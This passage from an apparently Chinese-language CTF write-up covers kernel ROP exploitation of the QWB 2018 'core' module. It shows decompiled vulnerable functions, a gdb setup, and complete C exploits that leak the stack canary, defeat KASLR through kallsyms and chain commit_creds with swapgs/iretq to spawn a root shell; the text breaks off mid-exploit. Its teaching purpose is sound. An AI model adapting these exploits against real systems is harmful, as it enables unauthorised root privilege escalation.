class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><ul><li><code>swapgs</code> GS </li><li><code>sysretq</code><code>iretq</code></li></ul><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      rop</span><br><span class="line">    swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h2 id="-2018-core"><a href="#-2018-core" class="headerlink" title=" 2018 - core"></a> 2018 - core</h2><p><a href="https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ">https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ</a><br>w9xj</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/Q/give_to_player&gt; checksec core.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>init</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms &gt;/tmp/kallsyms #commit_credsprepare_kernel_cred </span><br><span class="line">echo 1 &gt;/proc/sys/kernel/kptr_restrict#cat /proc/kallsyms0</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/dmesg_restrict#dmesg</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>kaslr</p><h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p></p><p><code>struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);</code></p><ul><li><code>name</code></li><li><code>mode</code></li><li><code>parent</code>procfsNULL<code>/proc</code></li><li><code>proc_ops</code>proc_ops</li></ul><p><code>remove_proc_entry(const char *, struct proc_dir_entry *)</code></p><ul><li></li><li>NULL<code>/proc</code></li></ul><p> <a href="https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692">https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">            <span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*clone_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *, <span class="type">loff_t</span>,</span><br><span class="line">            u64);</span><br><span class="line">    <span class="type">ssize_t</span> (*dedupe_file_range)(<span class="keyword">struct</span> file *, u64, u64, <span class="keyword">struct</span> file *,</span><br><span class="line">            u64);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>writeunlocked_ioctlreleasewriteioctlclose</p><p>ioctlcase 0x6677889A</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>a1 &gt; 63__int64qmemcpy(v2, &amp;name, (unsigned __int16)a1);unsigned __int16,16bit(0xffffffffffff0000|(0x100))</p><p>namewrite</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ropcanarycommit_creds(prepare_kernel_cred(NULL))</p><p>core_readoffcase 0x6677889Ccanarycanary&#x2F;tmp&#x2F;kallsyms</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kaslr</p><p>canaryrsprsp+0x40</p><p><img src="/2023/08/14/kernel-rop/image-20230816144106041.png" alt="image-20230816144106041"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>kaslr</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file core.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002400&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b *(0x159+0xffffffffc0000000)&quot;</span><br><span class="line"><span class="meta prompt_">    # </span><span class="language-bash">-ex <span class="string">&quot;b core_ioctl&quot;</span></span> </span><br></pre></td></tr></table></figure><h3 id="commit-creds-amp-init-cred"><a href="#commit-creds-amp-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = init_cred;</span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/14/kernel-rop/image-20230816162343753.png" alt="image-20230816162343753"></p><p><img src="/2023/08/14/kernel-rop/image-20230816161321011.png" alt="image-20230816161321011"></p><h3 id="commit-creds-prepare-kernel-cred-NULL"><a href="#commit-creds-prepare-kernel-cred-NULL" class="headerlink" title="commit_creds(prepare_kernel_cred(NULL))"></a>commit_creds(prepare_kernel_cred(NULL))</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn 